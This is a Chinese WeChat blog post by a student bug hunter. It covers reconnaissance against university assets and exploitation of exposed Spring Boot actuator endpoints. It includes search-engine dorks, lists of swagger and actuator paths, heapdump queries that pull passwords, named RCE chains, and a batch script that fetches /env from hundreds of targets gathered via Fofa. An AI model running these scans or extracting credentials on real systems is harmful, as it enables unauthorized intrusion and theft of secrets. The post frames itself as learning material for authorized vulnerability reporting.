> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/e6ZdQOG2vekxTIANQlm3cg)

![](https://mmbiz.qpic.cn/mmbiz_png/OBLmObCsZtRhFM3KeDj0QMtHtS04jFyCfsXLsRytlX5oAxgTNL5dYAAe5swJaOREVqksBqdUW8nzibErssPRu5w/640?wx_fmt=png)

前言  

“

**申明****：本次测试只作为学习用处，请勿未授权进行渗透测试，切勿用于其它用途！**

****寒假在家无所事事，打开 edusrc，开启了不归路（狗头）****

”

![](https://mmbiz.qpic.cn/mmbiz_png/OBLmObCsZtRhFM3KeDj0QMtHtS04jFyCfsXLsRytlX5oAxgTNL5dYAAe5swJaOREVqksBqdUW8nzibErssPRu5w/640?wx_fmt=png)

****Part 1 ****引语********

  

“

**每一次成功的渗透，都有一个非常完备的信息搜集。**

**大师傅讲的好呀：信息搜集的广度决定了攻击的广度，知识面的广度决定了攻击的深度。**

**在 goby 乱扫的开始，我也是菜弟弟一样，看到什么都没感觉，直到有个师傅提醒了我：这不是 Sprint boot 框架么，洞这么多还拿不下？**

**这也就导致了我后来的一洞百分。**

**（只会偷大师傅思路的屑弟弟）**

”

![](https://mmbiz.qpic.cn/mmbiz_png/OBLmObCsZtRhFM3KeDj0QMtHtS04jFyCfsXLsRytlX5oAxgTNL5dYAAe5swJaOREVqksBqdUW8nzibErssPRu5w/640?wx_fmt=png)

****Part 2 信息收集****

  

“

**信息搜集可以从多个领域来看**

**公司，子公司，域名，子域名，IPV4，IPV6，小程序，APP，PC 软件等等等等 我主要在 EDUsrc 干活，各大高校也是算在公司内的**

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGa5ibGhMxZI0hWb3BkRnNUnlfprS74ibCpyzlVWwf7CvsibJVJDqibMVQFIUq2nbdfSfsUeKaB6hDcySw/640?wx_fmt=png)  

****比如某某大学，我们查到大学后还能干什么呢？****

**![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGa5ibGhMxZI0hWb3BkRnNUnlLkx4XGVZWXGUic9vM3fdRJ0tyJPSYVz7hB5YXBibOMabuBpiaCNfMJMwQ/640?wx_fmt=png)**

**那么我们就可以重点关注****备案网站****，****APP****，****小程序****，****微信公众号****，甚至于****微博****，**

**微博地点****，将他们转换为我们的可用资源。**

**企查查是付费的，我一般使用的是小蓝本**

**这样，域名，小程序，微信公众号，一网打尽，是不是感觉挺轻松的？**

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGa5ibGhMxZI0hWb3BkRnNUnlaoFiaYtzBGSTd4icOjUaH88hTwKDsCpt1Qa82HuYmTNVcnxxxcGORU9w/640?wx_fmt=png)

**有了域名之后，我们该如何是好了呢？**

**那当然是爆破二级域名，三级域名，我们可以选择** **OneforALL****，验证子域名，然后使用** **masscan** **验证端口，但是我一般使用的是子域名收割机**

**（当然 layer 也可以）**

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGa5ibGhMxZI0hWb3BkRnNUnlwCs0VwQhsyGrP3EuADBrav5resLHWpoSlXvbm32HHjKon8OAAItib4Q/640?wx_fmt=png)

**这里因为工具不是我本人的，不方便提供。**

**他会将 IPV4,IPV6, 部分域名都提供，那么我们先从 IP 入手**

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGa5ibGhMxZI0hWb3BkRnNUnlPUM4BeX9giaqiaozR0fFQY5Z0kLnFeAHj53FXI0lO6MBjQGVsBqCfF7w/640?wx_fmt=png)

**IP 我们可以做什么呢？**

**我们已经知道某个 ip 属于教育网段，那么怎么具体知道其他 ip 呢？**

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGa5ibGhMxZI0hWb3BkRnNUnlpUXQQ2mvhZ88rtc73X0lDZicuBQfr0aY1ytjtVGpzK1tTM8GmCQnNOQ/640?wx_fmt=png)

**我们可以定位 WHOIS**

**whois 中包含了****用户****，****邮箱****，以及****购买的网段****！**

**没错，****购买的网段****！**

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGa5ibGhMxZI0hWb3BkRnNUnliaPWb7KAX8qvZeGbHWS0T4q4h1ZlIrQNgFOD1I2JibphgU7iaz9fy5R8Q/640?wx_fmt=png)

**有了这个，妈妈再也不用担心我打偏了（狗头）**

**有了网段，我们大可以开展下一步**

”

![](https://mmbiz.qpic.cn/mmbiz_png/OBLmObCsZtRhFM3KeDj0QMtHtS04jFyCfsXLsRytlX5oAxgTNL5dYAAe5swJaOREVqksBqdUW8nzibErssPRu5w/640?wx_fmt=png)

****Part 3 ****主动信息搜集********

  

“

**在主动信息搜集的时候，我们可以使用一些强大的资产测绘工具，**

**goby****（目前在用），资产测绘还是挺不错的，他会有一些 web 服务，可以供你捡漏，不要担心没有 banner，有时候 goby 也不认识呢！**

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGa5ibGhMxZI0hWb3BkRnNUnla1T2AfAhEEeoX235Efp5u5V08AH89Fr05o8wu7rEZebRicwo7PHuxvw/640?wx_fmt=png)

**被动信息搜集就是使用一些在线的大量爬取的网站。**

**因为这些语法网上蛮多的，（个别）就不拿具体网站做展示了。**

```
Google hack语法
百度语法
Fofa语法
shodan语法
钟馗之眼
微步在线
```

**Google 语法**

**我们先来看 Google，Google 语法大家可能都比较熟悉**

```
site:"edu.cn"
```

**最基本的 edu 的网站后缀。**

```
inurl:login|admin|manage|member|admin_login|login_admin|system|login|user|main|cms
```

**查找文本内容：**  

```
site:域名 intext:管理|后台|登陆|用户名|密码|验证码|系统|帐号|admin|login|sys|managetem|password|username
```

**查找可注入点：**

```
site:域名 inurl:aspx|jsp|php|asp
```

**查找上传漏洞：**  

```
site:域名 inurl:file|load|editor|Files
```

**找 eweb 编辑器：**  

```
site:域名 inurl:ewebeditor|editor|uploadfile|eweb|edit
```

**存在的数据库：**  

```
site:域名 filetype:mdb|asp|#
```

**查看脚本类型：**

```
site:域名 filetype:asp/aspx/php/jsp
```

**迂回策略入侵：**

```
inurl:cms/data/templates/images/index/
```

**多种组合往往能散发不一样的魅力  
**

#### **百度语法**

**同 google 语法没有太大差距, 这里就不细说了  
**

#### **Fofa 语法**

**在 fofa 中如何定位一个学校呢？**

**有两个方法**

**一个是** **org****，一个是** **icon_hash**

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGa5ibGhMxZI0hWb3BkRnNUnliaSvpBN8ot6d7c1I8yCBgqxTY76ia2HWIAR36lOL3Q8r81Tib0rAxVYLQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGa5ibGhMxZI0hWb3BkRnNUnleGU6WLlfCS8OctfU9iaR3pZwX8MejTPrnpqa7KZDKcttSXwvjOhNlng/640?wx_fmt=png)

**有了这些还怕找不到资产？**

**因为一个学校的** **iconhash** **往往都是几个固定的，所以我们搜索 iconhash 的时候，也会有不一样的效果。**

**如下为 icon 脚本 (python2)**

```
import mmh3
import requests

response = requests.get(‘url/favicon.ico’,verify=False)
favicon = response.content.encode(‘base64’)
hash = mmh3.hash(favicon)
print hash
```

**那么问题来了，org 怎么找呢，别急**

**不同的搜索引擎 org 有略微不同**

**fofa 的 org 搜索**

```
 org="China Education and Research Network Center"
```

**当然全都是 org 的，（冲，乱杀）**

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGa5ibGhMxZI0hWb3BkRnNUnluqSlVe2XoVzpXdoTibdDv8mdK3NVpS8N8N1xNgAicsDjZ2WjtrrmA4nA/640?wx_fmt=png)

####   

#### **shodan 语法**

**shodan 和 fofa 大致相同，也是存在 org 和 icon 的，**

**只不过 org 有点不同**

```
org:"China Education and Research Network"
org:"China Education and Research Network Center"
```

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGa5ibGhMxZI0hWb3BkRnNUnlZOnxoC1nYbtoYLgWXhyOFj7T42oOKrWnGztM2mlkjyukgR77JWicDDw/640?wx_fmt=png)  

**shodan 这边有时候还会更加细分，某个大学也会有自己的组织，（随机应变喽）  
**

#### **钟馗之眼**

**钟馗之眼的好处在于，他会把所有组件的漏洞都罗列出来，便于检测**

```
organization:"China Education and Research Network Center"
```

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGa5ibGhMxZI0hWb3BkRnNUnlDIa1R5iby9wbun68qATuvNU9LZ4785w5gibod7AhKrUtia3ibhQrqS0Njg/640?wx_fmt=png)  

####   

#### **微步在线**

**正向查找都说了，那反向呢？**

**微步的反向 ip 查找域名十分好用**

**某高校一个 ip 甚至会绑定几百个域名**

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGa5ibGhMxZI0hWb3BkRnNUnlpVPWfhfgb514oQ4xX6dXuqMQzUtYREibFkAu0N6XzYkWsVXaNmmNxgA/640?wx_fmt=png)

**那是不是找到最新的域名发现时间，开始了呢！**

###   

### **小程序**

**好了好了，咱们话题要回来噢**

**姥爷们又说了，小程序有个 p，欸可不能这样**

**还记得我们刚刚说到的信息搜集吗？**

**刚刚企查查找到的小程序，里面也有相关服务器的接口才能通讯呀！**

**我们打开我们的** **crackminapp**

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGa5ibGhMxZI0hWb3BkRnNUnlpsalpx5rjDzyickJT6YYs4ZIHb41T2LQdkxQPR9D8vs5iawzib1vc2I3w/640?wx_fmt=png)

**将微信小程序包导进去，逆向源代码，  
**

**（如果有需要，会专门出一个如何寻找 / 抓包小程序）**

**在** **app.js** **中一般存在有主 url**

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGa5ibGhMxZI0hWb3BkRnNUnlAxeOibnJpC1mFkWJGYvz5cWcECEW9Uun4eKfzqic8obxpgoEnBrbDk9A/640?wx_fmt=png)

**我们需要去每个 js 页面中，寻找到合适的参数构造，接口，发包查看具体情况**

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGa5ibGhMxZI0hWb3BkRnNUnlAktuULPUJjxCfMv0ZWrjNTjnGMpc6ukJqbiaXNpjugEztIegibar3NUA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGa5ibGhMxZI0hWb3BkRnNUnlslL0YLs7LTWRNdiaLI7VOibVgT7ib95RVbvIdblp8Eq1DJ278icnkibKxyw/640?wx_fmt=png)

**欸？是不是就找到了呢？  
**

#### **App 抓包**

**app 抓包现在花样百出，我一般使用 charles**

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGa5ibGhMxZI0hWb3BkRnNUnlhAaRnGFj21aWnDcJ5pFviafYxkecqFQYVstJWHHmUgZdUpyKPeSpGqQ/640?wx_fmt=png)

**当然只能是安卓 7 以下，高版本的话需要自己去学习喽~ 百度一下**

**（如果有想用的，也是看看情况吧）  
**

**信息搜集的广度决定了攻击的广度，知识面的广度决定了攻击的深度。**

**如上这些，完全可以混合起来，达到更加完美的效果  
**

**（菜弟弟第一个文章，大佬们勿喷）。**

**所以，学习不要停下来啊，（希望之花~~~）  
**

”

![](https://mmbiz.qpic.cn/mmbiz_png/OBLmObCsZtRhFM3KeDj0QMtHtS04jFyCfsXLsRytlX5oAxgTNL5dYAAe5swJaOREVqksBqdUW8nzibErssPRu5w/640?wx_fmt=png)

****Part 4 ****漏洞寻觅****  
****

  

“

**这里需要时刻关注各大公众号的推文啦，星球啦，一般也能刷个十来分。**

**（这里感谢 PeQi 师傅的文库）膜拜膜拜~~ 有的老爷们问了：有了资产不会打呀，废物，骗子，RNM 退钱！（补个表情包）**

**欸，别急嘛，**

**0day 能挖到么？挖不到，**

**1day 拿来 piao，寒掺么？不寒掺！**

**收**

**Spring boot 是越来越广泛使用的 java web 框架，不仅仅是高校，企业也用的越来越多**

**那么如果有 Spring boot 的漏洞岂不是乱杀？**

**好，如你所愿**

```
https://github.com/LandGrey/SpringBootVulExploit
```

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGa5ibGhMxZI0hWb3BkRnNUnlusxjCwiarYYx0iaITGSrs7tfT1mm9XAmPOtlntYeSFOGngFplkc0vP3g/640?wx_fmt=png)

**这个就是一洞百分的 Spring boot（掏空了，掏空了 55555）**

**首先我们要知道**

**Spring boot 2** **和** **Spring Boot 1** **是不同的**

**payload 也是不同的**

#### **路由地址**

**swagger** **相关路由前两天有表哥也发了 fuzz，如果存在，那便可以冲了！**

```
/v2/api-docs
/swagger-ui.html
/swagger
/api-docs
/api.html
/swagger-ui
/swagger/codes
/api/index.html
/api/v2/api-docs
/v2/swagger.json
/swagger-ui/html
/distv2/index.html
/swagger/index.html
/sw/swagger-ui.html
/api/swagger-ui.html
/static/swagger.json
/user/swagger-ui.html
/swagger-ui/index.html
/swagger-dubbo/api-docs
/template/swagger-ui.html
/swagger/static/index.html
/dubbo-provider/distv2/index.html
/spring-security-rest/api/swagger-ui.html
/spring-security-oauth-resource/swagger-ui.html
```

#### **敏感信息**  

**最重要的当然是 env 和 /actuator/env 了**

**他们一个隶属于 springboot1 一个属于 springboot2**

```
/actuator
/auditevents
/autoconfig
/beans
/caches
/conditions
/configprops
/docs
/dump
/env
/flyway
/health
/heapdump
/httptrace
/info
/intergrationgraph
/jolokia
/logfile
/loggers
/liquibase
/metrics
/mappings
/prometheus
/refresh
/scheduledtasks
/sessions
/shutdown
/trace
/threaddump
/actuator/auditevents
/actuator/beans
/actuator/health
/actuator/conditions
/actuator/configprops
/actuator/env
/actuator/info
/actuator/loggers
/actuator/heapdump
/actuator/threaddump
/actuator/metrics
/actuator/scheduledtasks
/actuator/httptrace
/actuator/mappings
/actuator/jolokia
/actuator/hystrix.stream
```

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGa5ibGhMxZI0hWb3BkRnNUnlZabxK40qDXiaZCJT8gRx5PefuBTwRjaSdWXHiaFZibGdNq94yrQRH3OpA/640?wx_fmt=png)  

##### **heapdump**

**噢？这里又会有什么呢？**

**这里会有所有的堆栈信息哟**

**那些在 env 中加星号的都会出来哟**

**我们访问**

```
/heapdump
/actuator/heapdump
```

**然后使用 Memory Analyzer 工具 oql 查找即可  
**

**感谢 landGrey 师傅（站在巨人的肩膀上），非常感谢**

```
https://landgrey.me/blog/16/
```

**OQL 语句如下**  

```
select * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains(“password”))
```

**或**  

```
select * from java.util.LinkedHashMap$Entry x WHERE (toString(x.key).contains(“password”))
```

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGa5ibGhMxZI0hWb3BkRnNUnlKTV6TcJQlpNLS6I553JIkgs1Xv7A48bgJAsicxkMePbntiaA7L38jXlQ/640?wx_fmt=png)

**噢？，这都可以？**

**那当然，redis，数据库，拿下~**

**又有老爷问了：spring boot 不是 rce 嘛，骗子！**

**别着急**

**那么，最常见的 RCE 是什么呢？**

**eureka xstream deserialization RCE**

**需要先修改** **defaultZone** **然后刷新配置**

**注意！修改有风险，请提前联系相关人员！**

**注意！修改有风险，请提前联系相关人员！**

**注意！修改有风险，请提前联系相关人员！**

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGa5ibGhMxZI0hWb3BkRnNUnl1j223zGRj0E1bPQmZBUz86eROlZvW4OVo6ZWdnd3E6bqm9Usa8AlKw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGa5ibGhMxZI0hWb3BkRnNUnl8EnxdyXvk9p79Ys5KJV22Sb3WICCt1lACRzVuWjRB4n0qu6NNwMKOw/640?wx_fmt=png)

**我们怎么办呢，没办法呀啊 sir，只有 dnslog 来的实在**

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGa5ibGhMxZI0hWb3BkRnNUnlhU5V6c4uSYmzib7rs6QDp0r5LibZNWUiaOCbm2IyERAhM0xuwco6KMdpA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGa5ibGhMxZI0hWb3BkRnNUnlxkVeZBhqia8JmPeKOEhe2AicbDGiakuyWYY4bvxuyBia0Ae9LSDH4UemvA/640?wx_fmt=png)

**jolokia logback JNDI RCE**

**jolokia ！jolokia！jolokia! yyds**

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGa5ibGhMxZI0hWb3BkRnNUnlBHWPjtnWkicyxqx6iauyxibkBbkA6ZfxO0UVN4l3qwG0FnicZuuSfsgM9A/640?wx_fmt=png)

**详情可在那个师傅 github 里面学习哟~（详情不做展开）**

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGa5ibGhMxZI0hWb3BkRnNUnlRA77X0Np9S1ic5icStgBZ52a9AhC6IZfKiccqvVM7cE6CUPyTibcxk1z5g/640?wx_fmt=png)

  

---

**批量生产**
--------

**呼呼呼~ 终于来到这里啦，**

**学习了这么多，怎么找嘛，还是骗人~（语气逐渐低沉）**

**来了来了**

**如果我们在 fofa 中找 spring boot 的相关网站，我们可以使用 icon，app，还能使用关键字呀~**

**如何定位 spring boot 的呢？**

**报错 404 呀**

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGa5ibGhMxZI0hWb3BkRnNUnlriawRrLzv1Tj8ibR6VwNxD7ayDxLTPzLwQOy88EVRsR33TMtBkXeLGJA/640?wx_fmt=png)

**我们通过学习的信息搜集，一通合并**

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGa5ibGhMxZI0hWb3BkRnNUnlY5Te3mglgfSuAMh4Xau82PrDBF5EqMy6iaUFkePALQqnQWS5niaAicrzw/640?wx_fmt=png)

**ohhhh 600 个**

**其他 icon 等之类的方法不做演示（避免危害太大 5555555555）**

**这个是批量脚本，把 url 放到 list 里面就行啦**

```
import requests
list = ['','']
for i in list:
    try:
        url = "http://" +i + "/actuator/env"
        print(url)
        res = requests.get(url=url,allow_redirects=False,timeout=5)
        print(res.text)
        url = "http://" +i + "/env"
        print(url)
        res = requests.get(url=url,allow_redirects=False,timeout=5)
        print(res.text)
    except:
        pass
print("overeeeeeeeeeee")
```

**挖洞的时候，需要细心细心，再细心，因为一切往往都可能利用，****菜弟弟在线找小团团带，孤身奋战太难了~** **这里一个是想让大家记住的菜弟弟！**

**我是 wumingzhilian 下次再见~**

**![](https://mmbiz.qpic.cn/mmbiz_jpg/EWF7rQrfibGa5ibGhMxZI0hWb3BkRnNUnlbpVdPoskzE18RXIeqeSEKh3aXagTBybiaZiaUgFuumO2yRG05ylJaD4A/640?wx_fmt=jpeg)**

**在这里感谢各位师傅对我的帮助  
**

**（不分先后）**

*   al0neranger 师傅
    
*   二十岁只去过大卡司师傅
    
*   莫言师傅
    
*   fvcker 师傅
    
*   c 师傅
    
*   PeiQi 师傅
    
*   北美第一突破手师傅
    
*   望海寺师傅 
    

  

  

**如果对你有帮助的话  
那就长按二维码，关注我们吧！**  

![](https://mmbiz.qpic.cn/mmbiz_png/Qx4WrVJtMVKBxb9neP6JKNK0OicjoME4RvV4HnTL7ky0RhCNB0jrJ66pBDHlSpSBIeBOqCrOTaWZ2GNWv466WNg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_jpg/EWF7rQrfibGYIzeAryXG89shFicuMUhR5eYdoSEffib7WmrGvGmSPpdvYfpGIA7YGKFMoF1IrXutHXuD8tBBbAYJg/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_png/wKOZZiacmHTc9LIKRXddrzz6MosLdiaH4EQNQgzsrSXHObdAia8yeIlLz6MbK9FxNDr44G7FNb2DBufqkjpwiczAibA/640?wx_fmt=png)

**![](https://mmbiz.qpic.cn/mmbiz_gif/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fK0c7kH8Aa77gpMcYib3IVwvicSKgwrRupZFeUBUExiaYwOvagt09602icg/640?wx_fmt=gif)**  [实战 | 简单的 sql 注入与脚本的编写](http://mp.weixin.qq.com/s?__biz=Mzg5NjU3NzE3OQ==&mid=2247485464&idx=1&sn=07d0b9fbbb6f62d8f46d54484b56a241&chksm=c07fb3ecf7083afae9fc6ca0b21febcb9e4848d95036ec272969f0fd7c19325f116ed83aecb5&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_gif/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fK0c7kH8Aa77gpMcYib3IVwvicSKgwrRupZFeUBUExiaYwOvagt09602icg/640?wx_fmt=gif)  [记一次相对完整的渗透测试](http://mp.weixin.qq.com/s?__biz=Mzg5NjU3NzE3OQ==&mid=2247485464&idx=2&sn=23ac41201aa38ba22881c06632d60ce0&chksm=c07fb3ecf7083afa9b32725c4b288b11e376550f1d88b96243c649f5fe91ba9ea13be7b10d75&scene=21#wechat_redirect)  

![](https://mmbiz.qpic.cn/mmbiz_gif/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fK0c7kH8Aa77gpMcYib3IVwvicSKgwrRupZFeUBUExiaYwOvagt09602icg/640?wx_fmt=gif) [实战 | SQL 注入 - BOOL 盲注 - 一个小细节](http://mp.weixin.qq.com/s?__biz=Mzg5NjU3NzE3OQ==&mid=2247485586&idx=1&sn=148764c1aab126a76b0c459ec67dc1f8&chksm=c07fb366f7083a70301714c87c8d09d3ee2c0dd2567360a46e87372c62a0f0415074ca06631a&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_gif/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fK0c7kH8Aa77gpMcYib3IVwvicSKgwrRupZFeUBUExiaYwOvagt09602icg/640?wx_fmt=gif)  [实战 | 一次简单的信息收集到 getshell 的过程](http://mp.weixin.qq.com/s?__biz=Mzg5NjU3NzE3OQ==&mid=2247485252&idx=1&sn=88464e7c793a168d7f1c2506414c1695&chksm=c07fbcb0f70835a6a768376c3ee586e384b4e314d59aedaed0c04a2d6c9237e7314205e0f9dc&scene=21#wechat_redirect)

右下角求赞求好看，喵~